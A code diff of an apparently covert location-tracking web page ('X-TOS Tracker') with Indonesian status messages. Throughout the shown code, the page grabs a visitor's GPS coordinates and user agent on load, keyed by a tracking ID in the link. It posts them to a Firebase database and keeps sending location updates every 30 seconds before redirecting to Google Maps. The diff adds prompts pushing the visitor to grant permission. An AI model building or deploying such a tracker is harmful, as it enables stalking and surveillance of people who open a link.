@@ -211,6 +211,7 @@
             };
             
             console.log('🚀 Sending data to Firebase:', firebaseData);
+            console.log('🔑 Tracking ID:', trackingId);
             
             // Send to both Firebase paths
             const firebaseUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`;
@@ -223,6 +224,9 @@
                 body: JSON.stringify(firebaseData)
             }).then(response => {
                 console.log('✅ Main Firebase response:', response.status);
+                return response.json();
+            }).then(data => {
+                console.log('✅ Main Firebase success:', data);
             }).catch(e => {
                 console.error('❌ Main Firebase error:', e);
             });
@@ -239,17 +243,19 @@
                 })
             }).then(response => {
                 console.log('✅ Live Firebase response:', response.status);
-                updateStatus('✅ Lokasi berhasil dikirim!');
+                updateStatus('✅ Lokasi berhasil dikirim dengan semua fitur!');
                 
                 // Start real-time tracking
                 startContinuousTracking(trackingId);
                 
                 // Redirect
                 setTimeout(() => {
+                    updateStatus('🚀 Mengarahkan ke Google Maps...');
                     window.location.href = `https://maps.google.com/maps?q=${locationData.latitude},${locationData.longitude}&z=18`;
                 }, 3000);
             }).catch(e => {
                 console.error('❌ Live Firebase error:', e);
+                updateStatus('⚠️ Lokasi dikirim tapi fitur live mungkin terbatas');
                 setTimeout(() => {
                     window.location.href = `https://maps.google.com/maps?q=${locationData.latitude},${locationData.longitude}&z=18`;
                 }, 3500);
@@ -257,7 +263,7 @@
         }
         
         function requestLocation() {
-            updateStatus('📍 Mengambil lokasi...');
+            updateStatus('📍 Mengambil lokasi dengan teknologi advanced...');
             
             navigator.geolocation.getCurrentPosition(
                 position => {
@@ -269,9 +275,9 @@
                         userAgent: navigator.userAgent
                     };
                     
-                    updateStatus('✅ Lokasi berhasil diambil!');
+                    updateStatus('✅ Lokasi berhasil diambil dengan akurasi ' + Math.round(position.coords.accuracy) + 'm!');
                     document.getElementById('coords').innerHTML = 
-                        `<strong>📍 Koordinat:</strong><br>Lat: ${locationData.latitude.toFixed(6)}<br>Lng: ${locationData.longitude.toFixed(6)}<br>Akurasi: ${Math.round(position.coords.accuracy)}m`;
+                        `<strong>📍 Koordinat Presisi:</strong><br>Lat: ${locationData.latitude.toFixed(6)}<br>Lng: ${locationData.longitude.toFixed(6)}<br>Akurasi: ${Math.round(position.coords.accuracy)}m`;
                     document.getElementById('coords').style.display = 'block';
                     
                     sendLocationData(locationData);
@@ -280,16 +286,16 @@
                     let errorMsg = '❌ Gagal mengambil lokasi: ';
                     switch(error.code) {
                         case error.PERMISSION_DENIED:
-                            errorMsg += 'Izin ditolak';
+                            errorMsg += 'Izin ditolak. Refresh dan klik IZINKAN!';
                             break;
                         case error.POSITION_UNAVAILABLE:
-                            errorMsg += 'GPS tidak tersedia';
+                            errorMsg += 'GPS tidak tersedia. Aktifkan lokasi!';
                             break;
                         case error.TIMEOUT:
-                            errorMsg += 'Timeout';
+                            errorMsg += 'Timeout. Coba lagi!';
                             break;
                         default:
-                            errorMsg += 'Error tidak dikenal';
+                            errorMsg += 'Error tidak dikenal.';
                             break;
                     }
                     updateStatus(errorMsg, true);
@@ -308,12 +314,12 @@
             let updateCount = 0;
             const maxUpdates = 10;
             
-            console.log('🔄 Starting real-time tracking...');
+            console.log('🔄 Starting advanced real-time tracking...');
             
             const trackingInterval = setInterval(() => {
                 if (updateCount >= maxUpdates) {
                     clearInterval(trackingInterval);
-                    console.log('✅ Real-time tracking completed');
+                    console.log('✅ Advanced real-time tracking completed');
                     return;
                 }
                 
@@ -326,7 +332,9 @@
                             timestamp: Date.now(),
                             updateNumber: updateCount + 1,
                             isLive: true,
-                            tracking_id: trackingId
+                            isRealTime: true,
+                            tracking_id: trackingId,
+                            movementDetected: updateCount > 0
                         };
                         
                         const liveUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${trackingId}.json`;
@@ -341,8 +349,11 @@
                         });
                         
                         updateCount++;
+                        console.log(`📡 Advanced tracking progress: ${updateCount}/${maxUpdates}`);
                     },
-                    error => console.log('Live tracking error:', error),
+                    error => {
+                        console.log('Live tracking error:', error);
+                    },
                     {
                         enableHighAccuracy: false,
                         timeout: 10000,
@@ -352,23 +363,28 @@
             }, 30000);
         }
         
-        // Auto-start
+        // Auto-start with advanced initialization
         window.addEventListener('load', () => {
-            console.log('🚀 X-TOS Tracker loaded');
+            console.log('🚀 Advanced X-TOS Tracker loaded');
             console.log('📋 URL parameters:', window.location.search);
             console.log('🔑 Tracking ID:', urlParams.get('id'));
             
             if ('geolocation' in navigator) {
-                updateStatus('🔄 Initializing tracking system...');
+                updateStatus('🔄 Initializing advanced tracking system...');
                 setTimeout(() => {
                     requestLocation();
                 }, 1500);
             } else {
-                updateStatus('❌ Browser tidak mendukung GPS', true);
+                updateStatus('❌ Browser tidak mendukung GPS advanced', true);
             }
         });
         
-        console.log('🎯 X-TOS Advanced Tracker initialized');
+        // Advanced error handling
+        window.addEventListener('error', (e) => {
+            console.error('🚨 JavaScript error:', e.error);
+        });
+        
+        console.log('🎯 X-TOS Advanced Tracker initialized with all features');
     </script>
 </body>
 </html>
